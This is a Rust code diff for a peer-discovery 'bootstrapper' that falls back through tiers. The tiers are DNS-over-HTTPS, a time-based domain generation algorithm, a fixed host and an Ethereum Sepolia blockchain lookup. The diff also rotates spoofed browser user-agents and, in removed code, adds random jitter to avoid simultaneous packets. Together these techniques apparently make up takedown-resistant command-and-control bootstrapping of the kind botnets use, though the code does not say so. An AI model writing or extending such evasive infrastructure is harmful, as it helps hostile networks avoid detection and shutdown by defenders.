@@ -90,9 +90,6 @@ impl BootstrapProvider for DohProvider {
     fn name(&self) -> String {
         format!("DoH({} @ {})", self.domain, self.resolver_url)
     }
-    fn name(&self) -> String {
-        format!("DoH({} @ {})", self.domain, self.resolver_url)
-    }
 }
 
 /// DGA Provider (Time-based Domain Generation)
@@ -146,7 +143,19 @@ impl BootstrapProvider for DgaProvider {
 
 // --- REVISED STRUCT DEFINITION & IMPL ---
 
-// --- REVISED STRUCT DEFINITION & IMPL ---
+/// Blockchain Fallback Provider (Sepolia)
+pub struct EthProvider;
+
+#[async_trait::async_trait]
+impl BootstrapProvider for EthProvider {
+    async fn fetch_payload(&self, _client: &Client) -> Result<String, Box<dyn Error + Send + Sync>> {
+         Err("Use explicit Tier 3 call".into())
+    }
+
+    fn name(&self) -> String {
+        "Ethereum Sepolia (Fallback)".to_string()
+    }
+}
 
 pub struct ProfessionalBootstrapper {
     primary_providers: Vec<Arc<dyn BootstrapProvider>>, // Tier 1: dht.polydevs.uk
@@ -154,6 +163,13 @@ pub struct ProfessionalBootstrapper {
     client: Client,
 }
 
+impl ProfessionalBootstrapper {
+    pub fn new() -> Self {
+        let user_agents = vec![
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
+            "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
+        ];
         let ua = user_agents[rand::thread_rng().gen_range(0..user_agents.len())];
         
         // Default Configuration
@@ -232,84 +248,18 @@ pub struct ProfessionalBootstrapper {
             return Some(nodes);
         }
 
+        // Tier 3: Blockchain (Last Resort)
+        info!("[Bootstrap] Tier 2 Failed. Attempting Tier 3 (Sepolia Blockchain)...");
+        use crate::modules::eth_listener;
+        if let Some(nodes) = eth_listener::check_sepolia_fallback().await {
+             info!("[Bootstrap] SUCCESS via Tier 3 (Sepolia). Found {} peers.", nodes.len());
+             return Some(nodes);
+        }
+
         warn!("[Bootstrap] All Tiers Failed.");
         None
     }
 }
-/*
-impl ProfessionalBootstrapper {
-    pub fn new() -> Self {
-        let user_agents = vec![
-            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
-            "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
-        ];
-        let ua = user_agents[rand::thread_rng().gen_range(0..user_agents.len())];
-        
-        Self {
-            providers: Vec::new(),
-            client: Client::builder()
-                .timeout(Duration::from_secs(CONNECT_TIMEOUT_SEC))
-                .user_agent(ua)
-                .build()
-                .unwrap(),
-        }
-    }
-    
-    pub fn add_provider(&mut self, provider: Arc<dyn BootstrapProvider>) {
-        self.providers.push(provider);
-    }
-    
-    pub async fn resolve(&self) -> Option<Vec<(String, u16)>> {
-        info!("[Bootstrap] Starting Resolution. Pool Size: {}", self.providers.len());
-        
-        // Shuffle execution order? (Optional)
-        
-        let mut set = JoinSet::new();
-        
-        for provider in &self.providers {
-            let p = provider.clone();
-            let c = self.client.clone();
-            
-            set.spawn(async move {
-                // Jitter: Sleep 0-2s to avoid simultaneous packets
-                let jitter = rand::thread_rng().gen_range(0..2000);
-                tokio::time::sleep(Duration::from_millis(jitter)).await;
-                
-                debug!("[Bootstrap] Checking {}", p.name());
-                match p.fetch_payload(&c).await {
-                    Ok(payload) => {
-                        // Verify
-                        verify_signature(&payload).map(|ips| (p.name(), ips))
-                    }
-                    Err(e) => {
-                         debug!("[Bootstrap] Fetch Failed {}: {}", p.name(), e);
-                         Err(e)
-                    }
-                }
-            });
-        }
-        
-        // Wait for FIRST success (Race)
-        while let Some(res) = set.join_next().await {
-            match res {
-                Ok(Ok((source_name, peers))) => {
-                    info!("[Bootstrap] SUCCESS via {}. Found {} peers.", source_name, peers.len());
-                    // Abort support? `set.abort_all()` available in newer tokio, 
-                    // or just let them finish.
-                    set.abort_all(); 
-                    return Some(peers);
-                }
-                Ok(Err(_)) => { /* Provider failed, continue waiting */ }
-                Err(e) => { error!("[Bootstrap] Task Panic: {}", e); }
-            }
-        }
-        
-        warn!("[Bootstrap] All providers failed.");
-        None
-    }
-}
-*/
 
 // --- HELPER FUNCTIONS ---
 
